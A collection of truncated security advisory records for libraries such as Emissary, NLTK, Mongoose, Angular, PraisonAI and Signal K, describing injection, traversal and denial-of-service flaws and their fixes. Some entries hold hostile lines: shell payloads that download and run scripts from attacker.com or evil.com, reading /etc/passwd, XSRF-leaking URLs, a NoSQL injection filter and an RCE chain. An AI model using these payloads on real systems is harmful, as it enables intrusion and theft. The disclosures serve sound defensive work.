advisories.summary: Emissary has a Command Injection via PLACE_NAME Configuration in Executrix
advisories.description:
## Summary

The `Executrix` utility class constructed shell commands by concatenating
configuration-derived values — including the `PLACE_NAME` parameter — with
insufficient sanitization. Only spaces were replaced with underscores, allowing
shell metacharacters (`;`, `|`, `$`, `` ` ``, `(`, `)`, etc.) to pass through
into `/bin/sh -c` command execution.

## Details

### Vulnerable code — `Executrix.java`

**Insufficient sanitization (line 132):**
```java
this.placeName = this.placeName.replace(' ', '_');
// ONLY replaces spaces — shell metacharacters pass through
```

**Shell sink (line 1052–1058):**
```java
protected String[] getTimedCommand(final String c) {
    return new String[] {"/bin/sh", "-c", "ulimit -c 0; cd " + tmpNames[DIR] + "; " + c};
}
```

### Data flow

1. `PLACE_NAME` is read from a configuration file
2. `Executrix` applies only a space-to-underscore replacement
3. The `placeName` is used to construct temporary directory paths (`tmpNames[DIR]`)
4. `tmpNames[DIR]` is concatenated into a shell command string
5. The command is executed via `/bin/sh -c`

### Example payload

```
PLACE_NAME = "test;curl attacker.com/shell.sh|bash;x"
```

After the original sanitization: `test;curl_attacker.com/shell.sh|bash;x`
(semicolons, pipes, and other metacharacters preserved)

### Impact

- Arbitrary command execution on the Emissary host
- Requires the ability to control configuration values (e.g., administrative
  access or a compromised configuration source)

## Remediation

Fixed in [PR #1290](https://github.com/NationalSecurityAgency/emissary/pull/1290),
merged into release 8.39.0.

The space-only replacement was replaced with an allowlist regex that strips all
characters not matching `[a-zA-Z0-9_-]`:

```java
protected static final Pattern INVALID_PLACE_NAME_CHARS = Pattern.compile("[^a-zA-Z0-9_-]");

protected static String cleanPlaceName(final String placeName) {
    return INVALID_PLACE_NAME_CHARS.matcher(placeName).replaceAll("_");
}
```

This ensures that any shell metacharacter in the `PLACE_NAME` configuration
value is replaced with an underscore before it can reach a command string.

Tests were added to verify that parentheses, slashes, dots, hash, dollar signs,
backslashes, quotes, semicolons, carets, and at-signs are all sanitized.

## Workarounds

If upgrading is not immediately possible, ensure that `PLACE_NAME` values in all
configuration files contain only alphanumeric characters, underscores, and hyphens.

## References

advisories.summary: NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains
advisories.description:
## Summary

The public CCG lexicon parser `nltk.ccg.lexicon.fromstring` parses caller-influenced lexicon text with two pure-Python loops whose cost is quadratic in the input width. A service that parses an untrusted CCG lexicon string can be driven into tens of seconds of single-threaded CPU by a few-megabyte input, starving the request worker. No authentication or user interaction is required.

## Root Cause

`matchBrackets` consumes a bracket body one character at a time with `inside = inside + rest[0]; rest = rest[1:]`. The `rest = rest[1:]` tail re-slice copies the entire remaining string on every iteration, so a flat bracket body costs O(n^2). `augParseCategory` drives a `while rest != "":` operator loop that re-copies the regular-expression match tail (`rest = app[3]`) once per operator, which is also O(n^2) over a long operator chain. The parser carries a recursion-depth guard (`MAX_PARSE_DEPTH = 500`) that raises on deeply nested categories, but both quadratic loops run on flat input whose nesting depth stays at zero, so that guard never fires. No bound is applied to line length or category width before the text reaches these loops.

```text
Affected functions:
- nltk.ccg.lexicon.matchBrackets       (nltk/ccg/lexicon.py:149-172; tail re-slice at line 168)
- nltk.ccg.lexicon.augParseCategory    (nltk/ccg/lexicon.py:223-268; APP_RE tail re-copy at line 250)
Public entry point: nltk.ccg.lexicon.fromstring (nltk/ccg/lexicon.py:271), also re-exported as nltk.ccg.chart.fromstring.
```

## Impact

An attacker who can influence the CCG lexicon string parsed by an application causes sustained single-threaded CPU consumption (availability loss). The vulnerable path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with attacker-chosen input size, a few-megabyte payload costs tens of seconds per core, and a small number of concurrent requests can exhaust worker threads. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only; it does not wrap these pure-Python slicing loops, so it provides no protection here.

## Proof of Concept

```text
Environment: nltk 3.10.3, regex 2026.9.10, CPython. Run the parser on the shipped public API.
```

```python
import nltk.ccg.lexicon as L

# Vector A: flat bracket body -> matchBrackets tail re-slice is O(n^2)
n = 400000
lex_a = ":- S\nw => (" + "a" * n + ")\n"

# Vector B: long operator c

advisories.summary: NLTK: Quadratic-time CPU denial of service in Tree.chomsky_normal_form right-factor binarization via list.pop(0)
advisories.description:
## Summary

`Tree.chomsky_normal_form()` binarizes a parse tree and defaults to right factoring. For a node with N children the right-factor branch repeatedly removes the first element of a working list with `list.pop(0)`, which shifts all remaining elements each time, so binarizing one wide node costs O(N^2). An application that converts an attacker-supplied treebank tree to Chomsky Normal Form can be forced into tens of seconds of single-threaded CPU by one wide flat tree. No authentication or user interaction is required.

## Root Cause

In the default right-factor branch the transform executes `curNode[0:] = [nodeCopy.pop(0), newNode]` inside a loop over the N children of a node. `list.pop(0)` is O(len) because it shifts every remaining element down by one; performed N-2 times over a shrinking length-N list this sums to O(N^2). The left-factor branch instead uses `nodeCopy.pop()` (removing the last element), which is O(1) and linear overall, so the two branches differ only by this front-versus-back removal. No cap is placed on the child count of a node, and the public `Tree.fromstring` parser accepts an arbitrarily wide bracketed tree.

```text
Affected function:
- nltk.tree.transforms.chomsky_normal_form (nltk/tree/transforms.py; right-factor sink at line 168, O(1) left control at line 179)
Public entry points: nltk.tree.Tree.chomsky_normal_form (nltk/tree/tree.py:455, default factor="right"); nltk.tree.Tree.fromstring (nltk/tree/tree.py:592).
```

## Impact

An attacker who can influence the tree that an application normalizes to Chomsky Normal Form causes sustained single-threaded CPU consumption (availability loss). The path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with the attacker-chosen child count, roughly 1.5 MB of treebank input costs about 14 seconds on one core and scales as N^2 above that. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only and does not wrap this pure-Python list loop.

## Proof of Concept

```text
Environment: nltk 3.10.3, CPython. Drive the public transform on a wide flat tree.
```

```python

advisories.summary: NLTK: Quadratic-time CPU denial of service in ConllCorpusReader SRL instance builder via nested span rescan
advisories.description:
## Summary

`ConllCorpusReader.srl_instances()` builds semantic-role-labeling instances from a CoNLL corpus block. For a sentence block with P predicates and P span columns, the instance builder rescans every span column (and every span within it) once per predicate while searching for each predicate's head, giving O(P^2 * R) work. A single well-formed block that places the head span in the last column forces the full scan on every predicate, so an application that reads an attacker-supplied CoNLL SRL corpus can be driven into tens of seconds of single-threaded CPU. No authentication or user interaction is required.

## Root Cause

`_get_srl_instances` iterates over the P predicates of a block; for each predicate it scans every span list and every span within it, using an inner `break` that stops only when a span tagged `V` or `C-V` containing the predicate word is found. When the sole head span is placed in the last span column, no earlier column matches, so the `for ... else: continue` construct traverses every span of every earlier column before matching. Over P predicates each scanning up to P columns of R spans, the cost is O(P^2 * R). The block is read whole with no size cap, and the grid-consistency check enforces only uniform column count, not a bound on P, R, or total work.

```text
Affected function:
- nltk.corpus.reader.conll.ConllCorpusReader._get_srl_instances (nltk/corpus/reader/conll.py:394-424; nested rescan at lines 405-419)
Public entry point: nltk.corpus.reader.conll.ConllCorpusReader.srl_instances (nltk/corpus/reader/conll.py:158-169).
```

## Impact

An attacker who can supply a CoNLL corpus that an application loads and iterates with `srl_instances()` causes sustained single-threaded CPU consumption (availability loss). The path is network-reachable through any corpus-ingestion surface (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost is super-linear in attacker-chosen predicate and column counts, a roughly 1 MB crafted corpus pins a core for tens of seconds and a few megabytes reaches minutes. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only and does not cover this pure-Python nested loop over the parsed grid. Exploitation requires the application to use the SRL-specific API on untrusted CoNLL data with `words`, `pos`, `tree`, and `srl` columns; a deployment that never calls `srl_instances()` is unaffected.

advisories.summary: Mongoose walks into inherited properties when hydrating, setting, and merging, allowing overwrites of built-in functions (denial of service) and shared schema state
advisories.description:
### Summary

Three Mongoose code paths copy data into objects by property name without checking whether the property is the object's own or inherited from its prototype:

1. Loading a document from the database (`init()`, also used by `Model.hydrate()`)
2. Setting a dotted path on a document (`$__set`, used by `new Model(obj)`, `doc.set()` and `doc.$set()`)
3. Merging update documents (`utils.mergeClone`, used by `findOneAndReplace()`, chained update calls and `Query.prototype.merge()`)

When a key names an inherited property, such as `toString` or `valueOf`, or a document internal such as `$__schema`, Mongoose writes into the shared object behind that property. The data comes from the attacker.

- **Denial of service.** For example, `{ "toString": { "call": 1 } }` overwrites `Object.prototype.toString.call`. Mongoose and most other libraries rely on `Object.prototype.toString.call()`. After the overwrite, every later query in the process throws `TypeError: _toString.call is not a function` until the process restarts. This includes queries on unrelated models.
- **Changing shared schema state.** Through a subdocument with `strict: false`, a path such as `profile.$__schema.paths.email.validators` reaches the subdocument's schema, which every document shares. Setting it to `[]` removes the `required` validator for every document in the process.

Mongoose already blocked `__proto__`, `constructor` and `prototype`, so these bugs cannot add properties to `Object.prototype` itself. They can still overwrite methods and properties of shared built-in functions and of Mongoose's internal objects.

### Details

#### 1. Loading documents: `init()`

```js
if (!schemaType && utils.isPOJO(value)) {
  // assume nested object
  if (!doc[i]) { doc[i] = {}; ... }
  init(self, value, doc[i], opts, path + '.');
}
```

For a stored field named `toString`, `doc[i]` is the inherited `Object.prototype.toString`. It is truthy, so `init()` recurses into that function and copies the stored subfields onto it.

This runs for every document Mongoose loads: `find()`, `findOne()`, cursors, populated documents and `Model.hydrate()`. It runs whatever the `strict` setting, and it applies to top-level and nested paths alike. `lean()` queries are not affected.

A malicious document can get into the collection in several ways:
- through a model with `strict: false`, for example `new Model(req.body).save()`;
- through another application or the raw MongoDB driver;
- through any update that write

advisories.summary: NLTK: Unbounded CPU consumption in SteppingRecursiveDescentParser.parse() with ambiguous or self-embedding grammars
advisories.description:
## Summary

`nltk.parse.recursivedescent.SteppingRecursiveDescentParser.parse()` performs an unbounded top-down search over ambiguous or self-embedding context-free grammars with no wall-clock or step limit. An actor who can influence the grammar and supply a short input to a caller that uses this parser can force a single `parse()` call to pin a CPU core indefinitely, producing a denial of service. The related base class `RecursiveDescentParser` gained a `max_time` wall-clock deadline, but the stepping subclass drives its own step loop and never arms or consults that deadline, and its constructor does not accept a `max_time` parameter, so the guard cannot be enabled on this path.

## Root Cause

`RecursiveDescentParser` bounds its recursive search inside `_parse`: it arms a wall-clock deadline on the first step and raises `TimeoutError` once `max_time` (default 5.0 seconds) is exceeded. `SteppingRecursiveDescentParser` was designed for interactive single-stepping and overrides both `parse()` and `_parse`. Its `parse()` runs `initialize()` followed by a `while self.step() is not None` loop that never enters the guarded base `_parse`. Its `_parse` override is a state-capturing stub that records history and returns a sentinel, and it never references the inherited `self._parse_deadline` or `self._max_time`. Its `__init__` signature omits `max_time` entirely, so a caller cannot enable or tighten a bound. The security invariant that a single parse must terminate within a bounded time is therefore never enforced on this parser.

```text
Affected component: nltk.parse.recursivedescent.SteppingRecursiveDescentParser
- parse()      nltk/parse/recursivedescent.py:428-433  (drives its own step loop, no bound armed or checked)
- _parse()     nltk/parse/recursivedescent.py:643-668  (stub override; never consults self._parse_deadline / self._max_time)
- __init__()   nltk/parse/recursivedescent.py:410-418  (signature (self, grammar, trace=0); no max_time parameter)
Base guard for comparison: RecursiveDescentParser._parse nltk/parse/recursivedescent.py:141-150
```

## Impact

An actor who controls or influences the grammar passed to `SteppingRecursiveDescentParser` and can supply a short token sequence to a caller that invokes `parse()` can cause that call to never return. The top-down search enumerates a derivation space that grows on the order of the Catalan numbers with no memoization of the search and no deadline, so one crafted grammar plus a short input determinist

advisories.summary: Forge: ReDoS in forge.http response header and cookie trimming
advisories.description:
`forge.http` trims response header and `Set-Cookie` values with the regular expression `/\s*$/`, which takes quadratic time on a long run of whitespace followed by another character. A server or on-path attacker can block a `forge.http` client for minutes with one large response header. Fixed in node-forge 1.4.3.

### Details
`_trimString()` in `lib/http.js` removes trailing whitespace with `str.replace(/\s*$/, '')`. On a string of n whitespace characters followed by a non-whitespace character, the regular expression engine tries a match at each of the n positions and scans the rest of the run each time, so the work is O(n^2). `forge.http` calls `_trimString()` on every response header value read by `response.readHeader()`, and again on cookie names and values in `response.getCookies()`. There is no limit on header size.

With Node.js 24, an 80 KB header value takes about 4 seconds to parse, and 1 MB about 10 minutes, during which the event loop (or browser tab) is blocked.

`forge.http` is not loaded by `require('node-forge')`. It is part of the `forge.all` bundle and needs a socket pool provided by the application (historically Flash sockets via `forge.xhr`), so few applications use it.

The fix trims trailing whitespace with a loop, as `lib/pem.js` has done since 1.4.1. The trimmed result is unchanged.

#### Patches
Fixed in node-forge 1.4.3.

#### Workarounds
Limit the size of HTTP response headers before passing them to `forge.http`, for example in the socket pool's data handler.

#### Resources
- Related: GHSA-7wch-p9px-956x (ReDoS in PEM decoding, fixed in 1.4.1): https://github.com/digitalbazaar/forge/security/advisories/GHSA-7wch-p9px-956x

#### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (5.9, Moderate)

## 1. Executive Summary

JSON-java version 20260522 contains an unguarded path from an HTTP request body to unbounded `BigInteger` and `BigDecimal` construction. `JSONTokener.nextSimpleValue()` accumulates numeric characters into a `StringBuilder` with no length cap, then passes the full string to `JSONObject.stringToNumber()`, which calls `new BigInteger(val)` or `new BigDecimal(val)` directly. Both constructors have polynomial time complexity (O(n^1.585) for `BigInteger`).

A 488 KB JSON body — well within nginx's default 1 MB body-size limit — contains a 500,000-digit numeric literal that blocks the handling thread for approximately 3 seconds. Spring Boot has no default size limit for `application/json` request bodies. No parser configuration option (`withStrictMode`, `withKeepStrings`) prevents this. All three primary entry points are affected: `new JSONObject(String)`, `new JSONArray(String)`, and `XML.toJSONObject(String)`.

This vulnerability is distinct from CVE-2023-5072 (which addressed `StackOverflowError` from deeply nested JSON *structures* via a `try/catch` in `nextValue()`) and from CVE-2022-45688 (which addressed recursive XML nesting depth). The numeric string length issue has been present since BigInteger support was introduced in release 20150729 and has never been fixed in any subsequent release.

advisories.summary: @angular/common: XSRF Token Leakage via URL Parsing Discrepancy in Angular HTTP Client (Incomplete fix for CVE-2025-66035)

An incomplete fix for [GHSA-58c5-g7wp-6w37](https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37) (`CVE-2025-66035`) in `@angular/common`'s HTTP Client (`HttpClient`) allows Cross-Site Request Forgery (XSRF) tokens to be leaked to attacker-controlled cross-origin domains when requests use URLs that exploit parsing discrepancies between regular expressions and the browser's WHATWG URL parser.

### Technical Description

To address `CVE-2025-66035`, `xsrfInterceptorFn` introduced a regular expression (`const ABSOLUTE_URL_REGEX = /^(?:https?:)?\/\//i`) to detect and skip absolute and protocol-relative URLs before attaching the `X-XSRF-TOKEN` header.

However, browsers resolve request URLs passed to `fetch()` and `XMLHttpRequest.open()` using the **WHATWG URL parser**. For `http:` and `https:` schemes, the WHATWG URL standard performs several normalizations prior to resolving the authority/origin:
* Backslashes (`\`) are treated as forward slashes (`/`) — e.g., `/\evil.example/x`, `\\evil.example/x`, `\/evil.example/x`, `https:\\evil.example/x`, `https:/\evil.example/x`.
* Leading and trailing C0 control characters and spaces (`<= 0x20`) are stripped — e.g., `' //evil.example/x'`, `'\0//evil.example/x'`, `'\x1f//evil.example/x'`.
* ASCII tab (`\t`), newline (`\n`), and carriage return (`\r`) characters are removed anywhere in the input — e.g., `'/\t/evil.example/x'`, `'/\n/evil.example/x'`, `'htt\tps://evil.example/x'`.

Because these URLs do not match `/^(?:https?:)?\/\//i`, `xsrfInterceptorFn` treats them as relative same-origin URLs and attaches the `X-XSRF-TOKEN` header, while the browser resolves and dispatches the request to the cross-origin host (`evil.example`).

However, the `20.3.x` LTS branch retained the regular expression until `20.3.34`.

The token leakage bypasses Angular's built-in XSRF protection on affected versions, allowing an attacker to capture the user's valid `X-XSRF-TOKEN` header if their server permits the request and custom header via CORS. Once obtained, the attacker can perform Cross-Site Request Forgery (CSRF) attacks against the victim user's session.

advisories.summary: PraisonAI has an incomplete fix for CVE-2026-34935 - OS Command Injection
advisories.description:
### Summary

The fix for PraisonAI's MCP command handling does not add a command allowlist or argument validation to `parse_mcp_command()`, allowing arbitrary executables like `bash`, `python`, or `/bin/sh` with inline code execution flags to pass through to subprocess execution.

### Affected Package

- **Ecosystem:** PyPI
- **Package:** MervinPraison/PraisonAI
- **Affected versions:** < 47bff65413be
- **Patched versions:** >= 47bff65413be

### Details

The vulnerability exists in `src/praisonai/praisonai/cli/features/mcp.py` in the `MCPHandler.parse_mcp_command()` method. This function parses MCP server command strings into executable commands, arguments, and environment variables. The pre-patch version performs no validation on the executable or arguments.

The fix commit `47bff654` was intended to address command injection, but the patched `parse_mcp_command()` still lacks three critical controls: there is no `ALLOWED_COMMANDS` allowlist of permitted executables (e.g., `npx`, `uvx`, `node`, `python`), there is no `os.path.basename()` validation to prevent path-based executable injection, and there is no argument inspection to block shell metacharacters or dangerous subcommands.

Malicious MCP server commands such as `python -c 'import os; os.system("id")'`, `bash -c 'cat /etc/passwd'`, and `/bin/sh -c 'wget http://evil.com/shell.sh | sh'` are all accepted by `parse_mcp_command()` and passed directly to subprocess execution without filtering.

### PoC

```python
#!/usr/bin/env python3
"""
CVE-2026-34935 - PraisonAI command injection via parse_mcp_command()

Tests against REAL PraisonAI mcp.py from git at commit 66bd9ee2 (parent of fix 47bff654).
The pre-patch parse_mcp_command() performs NO validation on the executable or
arguments, allowing arbitrary command execution via MCP server commands.

Repo: https://github.com/MervinPraison/PraisonAI
Patch commit: 47bff65413beaa3c21bf633c1fae4e684348368c
"""

import sys
import os
import importlib.util

# Load the REAL mcp.py from the cloned PraisonAI repo at vulnerable commit
MCP_PATH = "/tmp/praisonai_real/src/praisonai/praisonai/cli/features/mcp.py"

def load_mcp_handler():
    """Load the real MCPHandler class from the vulnerable source."""
    base_path = "/tmp/praisonai_real/src/praisonai/praisonai/cli/features/base.py"

    spec_base = importlib.util.spec_from_file_location("features_base", base_path)
    mod_base = importlib.util.module_from_spec(spec_base)
    sys.modules["features_base"] = mod_base

advisories.summary: AutoMapper: Denial of Service via uncontrolled recursion that bypasses MaxDepth
advisories.description:
### Summary
The default and explicit `MaxDepth` limits added for CVE-2026-32933 don't apply to several mapping paths. Mapping a deeply nested source through any of them recurses without bound and throws a `StackOverflowException`, which can't be caught and terminates the process.

### Affected paths
- **Polymorphic maps:** derived type maps (`Include` / `IncludeBase`) didn't inherit the base map's `MaxDepth`, and the default limit for self-referential maps was only applied to the base map. A chain of derived objects was mapped without a limit, even with `MaxDepth` set on the base map.
- **Runtime-typed members:** members typed as `object` or an interface aren't seen by self-reference detection, so the default limit isn't applied.
- **Dictionary and dynamic sources:** mapping a nested `Dictionary<string, object>` or `ExpandoObject` (for example, deserialized JSON) onto typed destinations recurses with no depth tracking. `MaxDepth` has no effect.
- **Recursive type converters:** `ConvertUsing` that calls `context.Mapper.Map` ignores `MaxDepth`.

### Impact
An application that maps attacker-influenced, deeply nested data through one of these paths can be crashed. On a 1 MB stack (the Windows default), a few thousand levels of nesting are enough.

### Fix
- Derived type maps inherit `MaxDepth`, and the default limit is applied to them.
- Every runtime map call checks for sufficient stack, and fails with a catchable `InsufficientExecutionStackException` instead of overflowing.

### Workarounds
Set `MaxDepth` explicitly on derived maps and on maps reached through `object` or interface members. There is no configuration workaround for dictionary or dynamic sources, or for recursive type converters, other than limiting input depth before mapping.

### Related
- CVE-2026-32933 (GHSA-rvv3-g6hj-g44x)
- GHSA-6vhm-j9h7-f9gh: `MaxDepth` not enforced through constructor parameters and positional records, fixed in the same releases.

advisories.summary: Soup Sieve: Polynomial-time denial of service in the descendant combinator
advisories.description:
## Summary

Matching a selector that uses the descendant combinator (`a b`) takes time that grows polynomially with how deeply the document is nested, and each extra descendant combinator in the selector raises the degree by one. A selector with `k` descendant combinators takes `O(n^(k+1))` time on a chain of `n` nested elements.

An attacker who controls the HTML or XML that an application passes to Soup Sieve (directly, or through Beautiful Soup's `select()`, `select_one()`, `css.select()`, etc.) can send a very small, deeply nested document that keeps a CPU busy for seconds to minutes against an ordinary selector such as `section div div`.

## Details

To match `a b`, Soup Sieve checks each element against `b` and then walks up through its ancestors looking for one that matches `a`. When the selector has more descendant combinators, the rest of the selector is tried again from each ancestor on that walk, and so on for every combinator. Nothing was reused between walks, so the same ancestors were matched against the same part of the selector over and over.

The worst case is when the leftmost part of the selector never matches, as in `section div div` against a document of nested `<div>` with no `<section>`: every walk goes all the way to the root and no search can stop early.

### Timings

Example timings with `html.parser` on Soup Sieve 3.0.4 and 4.0, using a document of nested `<div>` (5 bytes each) and no matches:

| Nesting depth | Input size | Selector | 3.0.4 | 4.0 |
| --- | --- | --- | --- | --- |
| 2,000 | 10 KB | `section div` | 1.6 s | 0.05 s |
| 4,000 | 20 KB | `section div` | 5.1 s | 0.01 s |
| 400 | 2 KB | `section div div` | 6.7 s | < 0.01 s |
| 800 | 4 KB | `section div div` | 53.0 s | < 0.01 s |
| 100 | 0.5 KB | `section div div div` | 2.5 s | < 0.01 s |
| 200 | 1 KB | `section div div div` | 40.9 s | < 0.01 s |

None of these selectors use unusual syntax.

## Proof of concept

```py
import time
import bs4
import soupsieve as sv

soup = bs4.BeautifulSoup('<div>' * 200, 'html.parser')
t = time.process_time()
sv.select('section div div div', soup)
print(time.process_time() - t)
```

advisories.summary: Mongoose: Connection-level sanitizeFilter not applied
advisories.description:
### Summary

sanitizeFilter exists to stop query selector injection: it wraps operator objects such as `{ $ne: null }` in filter values in `$eq`, so they are matched literally. Set on a connection with `mongoose.connect()` or `createConnection(uri, { sanitizeFilter: true })`, the connection reports it as enabled but queries never apply it. An application that relies on the connection-level option and passes an attacker-controlled object into a filter therefore remains open to selector injection, and a password value of `{ $ne: null }` returns the account record without the password.

### Details

`NativeConnection#createClient()` at `lib/drivers/node-mongodb-native/connection.js:270-272` moves `options.sanitizeFilter` into `Connection.config` and deletes the original option. `Query#_castConditions()` at `lib/query.js:2413-2423` checks `Connection.options`, the global `options`, and the per-query options, but never `Connection.config`. The defense therefore does not run even though `Connection#get('sanitizeFilter')` returns true. This storage was introduced in Mongoose 6.0.0 and the same mismatch is present in 9.11.2.

### Proof of concept

```javascript
import mongoose from 'mongoose'

const conn = await mongoose.createConnection('<MONGODB_URI>', { sanitizeFilter: true }).asPromise()
const User = conn.model('User', new mongoose.Schema({
  username: String,
  password: String,
  marker: String
}))

await User.create({
  username: 'victim',
  password: 'correct-password',
  marker: 'PROTECTED_RECORD'
})

const filter = { username: 'victim', password: { $ne: null } }
console.log(conn.get('sanitizeFilter'))
console.log((await User.findOne(filter).lean()).marker)
```

A control query with a literal wrong password returned no document in the same run, confirming the filter is otherwise enforced.

### Impact

Connection-level `sanitizeFilter` option is not respected. Any user that relies on connection-level config and `sanitizeFilter` to defend against query selector injection is affected. Users that set `sanitizeFilter` globally using `mongoose.set('sanitizeFilter')` or on specific queries using `Model.find().sanitizeFilter()` are not affected.

advisories.summary: Signal K resources API path traversal can disclose the JWT signing secret and enable remote code execution
advisories.description:
### Summary

Path traversal in the Signal K resources and applicationData APIs lets an
unauthenticated or low-privileged user read, write and delete files outside
the storage root. Reading <config>/security.json discloses the JWT signing
secret, enabling admin token forgery and remote code execution. 

### Details

## Description

The v2 REST resources API `GET /signalk/v2/api/resources/:resourceType/:resourceId` passes `resourceId` to `FileStore.getResource()` without validation. `getResource()` builds the file path with `path.join(this.resources[type].path, itemUuid)` followed by `readFile` + `JSON.parse`, so a `%2F`-encoded multi-level traversal (`..%2F..%2F..%2F..%2F`) escapes the resource storage directory and returns any JSON file on the server (source: `src/api/resources/index.ts:559-600`, `packages/resources-provider-plugin/src/filestorage.ts:115-125`).

Because the JWT signing secret is stored in plaintext in `<config>/security.json` (generated at `src/tokensecurity.ts:271`, persisted via `saveSecurityConfig` at `src/security.ts:377`), an unauthenticated attacker on deployments with `allow_readonly=true` (a supported, UI-toggleable configuration granting anonymous read access) can:

1. **Read `<config>/security.json`** — disclosing the JWT signing secret (512-hex) and user password hashes.
2. **Forge an admin JWT** — HS256-sign `{"id":"admin"}` with the disclosed secret; accepted by `/skServer/loginStatus` (`userLevel: "admin"`) and all admin-protected endpoints (`adminAuthenticationMiddleware`, `src/tokensecurity.ts:593`, applied at `src/tokensecurity.ts:953`).
3. **Gain remote code execution** — `POST /skServer/providers` (admin) accepts a provider of type `Execute`; `packages/streams/src/execute.ts:93` executes it via `spawn('sh', ['-c', command])` at creation time. The provider persists to `settings.json` and survives restarts.

On default deployments (`allow_readonly=false`), step 1 returns 401 to anonymous users but succeeds with any readonly user token.

## Suggested fixes

1. Validate `resourceId` against a strict whitelist (for example, UUID format) in `src/api/resources/index.ts` before any storage call, including PUT/DELETE.
2. In `FileStore.getResource/setResource/deleteResource`, canonicalise with `path.resolve()` and reject results outside `this.resources[type].path`.
3. Store the JWT signing secret outside the API-readable config directory, in a dedicated key file with mode 0600.
4. Consider gating provider types that execute comman

advisories.summary: logto-tunnel serves files outside `--experience-path` via path traversal
advisories.description:
### Summary

`@logto/tunnel` serves custom sign-in experience files from the `--experience-path` directory. When the tunnel service is reachable, a requester can use `../` path segments in a static asset request to read files outside that directory that the CLI process can read.

### Details

The tunnel command accepts `--experience-path` as the local folder path for custom sign-in experience assets. `packages/tunnel/src/commands/tunnel/index.ts` enables `createStaticFileProxy(path)` when that option is set and sends non-Logto, non-`--experience-uri` requests to that static proxy. The server is started with `server.listen(port)`.

`packages/tunnel/src/commands/tunnel/utils.ts` builds the filesystem path as `path.join(staticPath, fallBackToIndex ? index : request.url)`. For file asset paths, `request.url` is used directly. A request URL such as `/../secret.txt` resolves outside `staticPath` and is then opened with `fs.open(requestPath, 'r')`. There is no URL normalization and no containment check that the resolved path remains under the configured static directory before the file is read and returned.

The proof boundary is the packaged CLI end-to-end run. The filesystem read primitive was validated with equivalent Node HTTP handling for the affected code path, including that Node preserves `/../secret.txt` in `request.url` and that bare `server.listen(port)` binds to all interfaces on this platform.

### PoC

1. Create a custom UI directory at `/tmp/logto-ui/static` with `/tmp/logto-ui/static/index.html`.
2. Create a sibling file outside the static root, for example `/tmp/logto-ui/secret.txt`.
3. Start the tunnel with `logto-tunnel --endpoint https://<tenant-id>.logto.app --port 9000 --experience-path /tmp/logto-ui/static`.
4. Request `http://<host>:9000/../secret.txt`.
5. The response body contains the contents of `/tmp/logto-ui/secret.txt`.

### Impact

The observed result is arbitrary file read outside the configured custom UI static directory. If the tunnel port is reachable from another host, an unauthenticated network peer can read local files readable by the `logto-tunnel` process, including development secrets or credentials stored near the custom UI project.

advisories.summary: Mobile Security Framework (MobSF) Allows Web Server Resource Exhaustion via ZIP of Death Attack
advisories.description:
**Vulnerable MobSF Versions:** <= v4.3.2

**Details:**
MobSF is a widely adopted mobile application security testing tool used by security teams across numerous organizations. Typically, MobSF is deployed on centralized internal or cloud-based servers that also host other security tools and web applications. Access to the MobSF web interface is often granted to internal security teams, audit teams, and external vendors. 

MobSF provides a feature that allows users to upload ZIP files for static analysis. Upon upload, these ZIP files are automatically extracted and stored within the MobSF directory. However, this functionality lacks a check on the total uncompressed size of the ZIP file, making it vulnerable to a ZIP of Death (zip bomb) attack.

Due to the absence of safeguards against oversized extractions, an attacker can craft a specially prepared ZIP file that is small in compressed form but expands to a massive size upon extraction. Exploiting this, an attacker can exhaust the server's disk space, leading to a complete denial of service (DoS) not just for MobSF, but also for any other applications or websites hosted on the same server.

**Attack Scenario:**
Suppose the server hosting MobSF has 5 GB of free disk space..

A malicious user will first create a genuine hello world application code using android studio and inside this code directory (app//src/main/java/APK_PATH/bomb.txt) he'll place a bomb.txt file. 

This bomb.txt file will have billions of zeros to increase the file size on storage and make it to 4.99 GB. Now suppose the resultant hello world code directory including original code and bomb.txt files will be of 5GB, so the attacker will compress the entire hello world code directory to zip and resultant zip will be around 12-15 MBs only.

An attacker will upload this zip bomb using the MobSF web interface or API. So an attacker will spend only 12-15 MB of his bandwidth. 

Now the MobSF tool will extract that zip file and it'll be automatically converted into its original size 5GB.

So now a web server will be forced to store 5GB of data and its storage will be exhausted by an attacker's single request. 

Web server's storage and resources will not be able to handle other running websites or applications as the storage is exhausted. This way an attacker can achieve complete Web Server Resource Exhaustion.

advisories.description:
### Summary

A maliciously crafted zone file could use a WKS record to consume excessive memory and CPU, possibly causing the process to exit due to memory exhaustion.

### Details

The `from_text()` parser does not check that a WKS record service number is between 0 and 65535 inclusive.  It then uses this number to resize the bitmap to accommodate a bit with that offset.  This can cause extremely large memory allocations, and also extends the array very inefficiently, wasting CPU.

### Proof of concept

This demonstrates the failure to limit the service number, though with a value that does not cause excessive memory or CPU consumption.

```
rd = dns.rdata.from_text("IN", "WKS", "10.0.0.1 udp 65536")
```

### Impact

If dnspython is used to read zonefile format where the attacker can control the type and rdata text, the program may consume excessive memory or CPU, denying service.

advisories.summary: msgpack-ruby JRuby decoder makes uncapped header-count allocations; a 5-byte message forces multi-GiB OOM
advisories.description:
### Summary

The **JRuby** implementation of msgpack (`msgpack` gem, `java` platform — pure Java decoder under `ext/java/`) sizes containers directly from the element count written in the message header, with **no cap at all**: no equivalent of the C unpacker's `SHRT_MAX` clamp (since 1.7.3) and none of the buffered-bytes cap that commit c8d42d8 added for CRuby in 1.8.6. A single 5-byte message decides how much memory a JVM process tries to allocate:

* `array32` header declaring `0x7FFFFFFF` elements → `new IRubyObject[0x7FFFFFFF]` (~8 GiB of reference slots) attempted immediately → `java.lang.OutOfMemoryError: Requested array size exceeds VM limit`.
* Counts *below* the VM's max-array-size but above available heap (e.g. 5×10⁸ with a 512 MiB heap) produce a **real allocation attempt** — `OutOfMemoryError: Java heap space` — the JVM genuinely tries to take the memory before failing.
* `str32`/`bin32` headers declaring `0x7FFFFFFF` bytes do the same via `readBytes(size)` → `new byte[size]`.
